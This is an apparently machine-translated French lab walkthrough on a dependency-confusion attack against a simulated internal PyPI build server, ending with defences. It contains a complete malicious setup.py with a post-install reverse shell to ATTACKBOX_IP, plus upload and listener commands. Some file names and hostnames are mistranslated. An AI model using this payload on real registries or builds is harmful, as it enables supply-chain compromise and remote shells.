Terminez la machine de la tâche 4 et démarrez la machine attachée à cette tâche pour effectuer l'exercice de confusion de dépendance. Si votre AttackBox n'est plus active, vous devrez également la redéployer. Nous devrons simuler le dépôt externe de paquets Pypi car le téléchargement de paquets malveillants est contraire aux conditions d'utilisation de Pypi. Pour vous assurer que vous pouvez accéder à ce dépôt et à l'application, utilisez la commande suivante pour ajouter une entrée à votre `/etc/hosts` fichier:

`sudo bash -c "echo 'MACHINE_IP external.pypi-server.loc' >> /etc/hosts"`

Environnement Expliqué

Cette machine simule un environnement de construction qui a les éléments suivants:

-   Responsable de la Dépendance Interne - Pypi
-   Build Server - Docker-Compose

L'environnement de construction va reconstruire un API application toutes les 5 minutes. Une fois que vous avez donné à la machine quelques minutes pour démarrer, vous pouvez vérifier que le API fonctionne en exécutant les éléments suivants:

`curl http://MACHINE_IP:8181/api/list`

Vous devriez voir que l'API répond avec un jeu de données. Si vous n'obtenez pas de réponse, attendez encore 5 minutes, puis réessayez.

Divulgation de Dépendance

Le développeur de l'application a posté une question sur un forum public:

*Télécharger le package sur Internal Pypi Server*

*Bonjour à tous, comment télécharger un paquet pip sur notre serveur interne Pypi? Je sais que j'utiliserais ce qui suit pour le télécharger à l'extérieur, mais que dois-je changer?*

`twine upload dist/datadbconnect-0.0.2.tar.gz`

*Y a-t-il un drapeau ou quelque chose que je peux ajouter?*

Dans le post, le développeur semble avoir divulgué le nom d'un paquet interne, et, **datadbconnect**. C'est tout ce dont nous avons besoin pour commencer notre attaque Dependency Confusion!

Exécution de Code à Distance dans l'étape d'Installation

Pour lancer une attaque Dependency Confusion, nous devrons développer et construire un paquet malveillant qui exécutera le code une fois installé. Puisque nous ne connaissons que le nom du paquet et que nous n'avons pas accès au code source, l'application échouera très probablement une fois qu'elle essaiera d'exécuter notre paquet, notre pari le plus sûr est d'obtenir l'exécution de code à distance plus tôt dans le processus. Par conséquent, nous voulons l'exécution de code à distance une fois l'installation du package terminée.

C'est probablement un bon endroit pour expliquer comment les packages Pip sont construits à partir de code Python. Si vous voulez explorer le processus plus en profondeur, jetez un oeil à des tutoriels comme [ceci](https://www.freecodecamp.org/news/how-to-create-and-upload-your-first-python-package-to-pypi/). Nous allons vous donner ici un aperçu rapide. Le paquet Pip le plus basique nécessite la structure suivante:

```
package_name/
    package_name/
    __init__.py
    main.py
    setup.py
```

-   **package_nom** c'est le nom du paquet que nous créons. Dans notre cas, ce sera datadbconnect
-   **__init__.p** chaque paquet Pip nécessite un fichier init qui indique à Python qu'il y a des fichiers ici qui devraient être inclus dans la construction. Dans notre cas, nous garderons ce vide.

-   **principal.py** - Le fichier principal qui s'exécutera lorsque le paquet est utilisé. Nous allons créer un fichier principal très simple.
-   **configuration.py** c'est le fichier qui contient les instructions de construction et d'installation. Lors du développement de packages Pip, vous pouvez utiliser setup.py, setup.cfg ou pyproject.toml. Cependant, comme notre objectif est l'exécution de code à distance, setup.py sera utilisé car c'est le plus simple pour cet objectif.

Recréez cette structure de dossier pour votre paquet malveillant. Ajoutez le code suivant à votre fichier main.py:

```
#!/usr/bin/python3
def main():
   print ("Hello World")

if __name__=="__main__":
   main()
```

Il s'agit simplement d'un code de remplissage pour s'assurer que le paquet contient du code pour la construction. La partie la plus importante est le code setup.py. Jetons un coup d'œil à ce à quoi ressemblerait un fichier setup.py normal:

```

from setuptools import find_packages
from setuptools import setup

VERSION = 'v0.0.1'

setup(
        name='datadbconnect',
        url='https://github.com/labs/datadbconnect/',
        download_url='https://github.com/labs/datadbconnect/archive/{}.tar.gz'.format(VERSION),
        author='Tinus Green',
        author_email='tinus@notmyrealemail.com',
        version=VERSION,
        packages=find_packages(),
        include_package_data=True,
        license='MIT',
        description=('''Dataset Connection Package '''
                  '''that can be used internally to connect to data sources '''),
)
```

Afin d'injecter l'exécution de code, nous devons nous assurer que le paquet exécute le code une fois qu'il est installé. Heureusement, setuptools, l'outillage que nous utilisons pour construire le package, a une fonctionnalité intégrée qui nous permet de nous accrocher à l'étape de post-installation. Ceci est généralement utilisé à des fins légitimes, telles que la création de raccourcis vers les binaires une fois qu'ils sont installés. Cependant, en combinant cela avec la bibliothèque os de Python, nous pouvons l'exploiter pour obtenir l'exécution de code à distance. Mettez à jour votre fichier setup.py avec les éléments suivants:

```
from setuptools import find_packages
from setuptools import setup
from setuptools.command.install import install
import os
import sys

VERSION = 'v9000.0.2'

class PostInstallCommand(install):
     def run(self):
         install.run(self)
         print ("Hello World from installer, this proves our injection works")
         os.system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKBOX_IP",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'')

setup(
        name='datadbconnect',
        url='https://github.com/labs/datadbconnect/',
        download_url='https://github.com/labs/datadbconnect/archive/{}.tar.gz'.format(VERSION),
        author='Tinus Green',
        author_email='tinus@notmyrealemail.com',
        version=VERSION,
        packages=find_packages(),
        include_package_data=True,
        license='MIT',
        description=('''Dataset Connection Package '''
                  '''that can be used internally to connect to data sources '''),
        cmdclass={
            'install': PostInstallCommand
        },
)
```

Jetons un coup d'oeil aux ajustements que nous avons faits. Premièrement, nous avons importé la bibliothèque d'installation de setuptools et la bibliothèque os:

```
from setuptools.command.install import install
import os
import sys
```

Nous avons également mis à jour la version de notre package pour nous assurer de gagner la course à la confusion des dépendances:

```
VERSION = 'v9000.0.2'
```

Ensuite, nous avons introduit une nouvelle fonction qui fonctionnera comme un crochet post-installation pour exécuter un shell inversé pour nous. N'oubliez pas d'ajouter votre AttackBox ou VPN IP:

```
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        print ("Hello World from installer, this proves our injection works")
        os.system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKBOX_IP",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'')
```

Enfin, nous accrochons le processus de post-installation dans notre configuration d'installation:

```
cmdclass={
        'install': PostInstallCommand
    },
```

Maintenant que nous avons créé le paquet, il est temps de le construire et de le télécharger sur le repo PyPI externe. Nous pouvons utiliser la commande suivante pour construire notre paquet:

`python3 setup.py sdist`

Une fois construit, notre paquet Pip sera disponible sous le dossier dist et peut être téléchargé dans le repo Pypi en utilisant twine:

`twine upload dist/datadbconnect-9000.0.2.tar.gz --repository-url http://external.pypi-server.loc:8080`

Si on vous demande des informations d'identification, laissez-les vides. Vous pouvez également ignorer en toute sécurité les messages d'erreur et d'avertissement tant que la sortie finale indique que le téléchargement du paquet atteint 100%. Juste un rappel encore une fois que nous simulons un repo PyPI externe pour ne pas enfreindre leurs conditions de service. S'il s'agissait d'une véritable attaque, le paquet serait téléchargé sur le principal de PyPI [repo](https://pypi.org/). Commençons un auditeur pour notre shell:

`nc -lvp 8080`

Nous pouvons tester l'exécution du code de notre paquet en l'installant directement nous-mêmes:

`pip3 install datadbconnect --trusted-host external.pypi-server.loc --index-url http://external.pypi-server.loc:8080 --verbose`

Vous devriez voir la ligne d'impression dans la sortie de la commande d'installation et voir que pip gèle lorsque vous obtenez une connexion shell inversée:

AttackBox Terminal

```
[thm@thm]$ nc -lvp 8080
Listening on 0.0.0.0 8080
Connection received on localhost 50098
$ whoami
root
```

Si cela fonctionne, redémarrez votre écouteur et attendez environ 5 minutes, vous devriez obtenir par magie un rappel du serveur de construction une fois qu'il essaie de reconstruire le conteneur docker et installe notre paquet malveillant!

Expliquer ce qui se passe en arrière-plan

Alors, comment cela se passe-t-il réellement? Plongeons dans la ligne vulnérable du DockerFile:

`RUN pip3 install datadbconnect --no-cache-dir --trusted-host internal.pypi-server.com --extra-index-url "http://internal.pypi-server:8081/simple/"`

Sachant qu'il s'agit d'un package interne, l'équipe de développement a ajouté un repo Pypi supplémentaire pour Pip à travers le `--extra-index-url` argument. Cependant, cela n'oblige pas Pip à télécharger le package à partir de cet emplacement. Au contraire, c'est juste un autre endroit où il peut chercher le paquet. Pip téléchargera donc le paquet à partir de *interne.pypi-serveur.com* (paquet légitime) et *externe.pypi-server.loc* (notre paquet malveillant) et comparer les deux versions. Puisque notre version est plus élevée, elle installera notre paquet à la place! C'est de là que vient le nom Confusion de dépendance!

Défenses

La protection des dépendances internes est une entreprise de sécurité massive. Puisque nous devons créer, maintenir et héberger ces dépendances nous-mêmes, le projet de sécurité est beaucoup plus grand que celui des dépendances externes. Les stratégies de défense suivantes devraient être envisagées pour toutes les dépendances internes:

-   Les dépendances internes doivent être activement maintenues. Cela garantira que les vulnérabilités dans ces dépendances n'affectent pas plusieurs applications et services.
-   L'infrastructure d'hébergement des dépendances internes doit être sécurisée. Les suivants [Livre blanc microsoft](https://azure.microsoft.com/mediahandler/files/resourcefiles/3-ways-to-mitigate-risk-using-private-package-feeds/3%20Ways%20to%20Mitigate%20Risk%20When%20Using%20Private%20Package%20Feeds%20-%20v1.0.pdf) fournit les trois domaines d'intervention suivants:

-   Référencez un flux privé, pas plusieurs. Cela contribue à protéger contre les attaques de confusion de dépendance. Avec notre exemple python, nous utiliserions `--index-url` argument au lieu de `--extra-index-url` pour indiquer que le paquet doit être collecté à partir de l'index spécifié.

-   Protégez vos colis à l'aide de portées contrôlées. En contrôlant les étendues des dépendances, il s'assurera que les dépendances sont verrouillées aux applications qui les nécessitent.
-   Utiliser des fonctionnalités de vérification côté client. Des contrôles tels que l'intégrité des sous-ressources ou le verrouillage de version garantissent que les applications et les services détecteront lorsque du code malveillant est introduit dans une dépendance et refuseront de l'exécuter.

-   Comme mesure de défense supplémentaire contre les attaques de confusion de dépendances, les noms des dépendances internes peuvent être enregistrés sur des gestionnaires de paquets externes sans le code source pour revendiquer le nom. Cela empêchera un attaquant d'enregistrer un paquet de même nom.
